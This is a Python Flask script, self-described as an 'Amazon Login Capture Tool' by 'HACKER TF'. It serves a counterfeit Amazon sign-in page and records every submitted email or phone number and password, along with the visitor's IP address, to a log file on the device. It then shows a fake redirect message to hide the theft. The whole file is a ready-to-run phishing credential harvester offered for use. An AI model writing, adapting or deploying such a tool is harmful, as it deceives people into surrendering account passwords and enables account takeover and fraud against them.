from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Amazon Sign-In</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f3f3f3; text-align: center; padding-top: 50px; }
        .box { background: white; padding: 30px; width: 320px; margin: auto; border: 1px solid #ddd; border-radius: 5px; }
        input, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 4px; border: 1px solid #ccc; }
        button { background: #f0c14b; border-color: #a88734; cursor: pointer; }
        img { width: 100px; margin-bottom: 20px; }
        .footer { margin-top: 20px; font-size: 12px; color: #888; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
        <h2>Sign-In</h2>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="Email or mobile phone number" required><br>
            <input type="password" name="password" placeholder="Amazon password" required><br>
            <button type="submit">Sign-In</button>
        </form>
    </div>
    <div class="footer">
        Made by HACKER TF
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr

    log = f"""
[+] Amazon Login
IP: {ip}
Email/Phone: {email}
Password: {password}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Redirecting to Amazon...</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;33m" + "="*40)
    print("         Made by HACKER TF        ")
    print("      Amazon Login Capture Tool   ")
    print("="*40 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5002)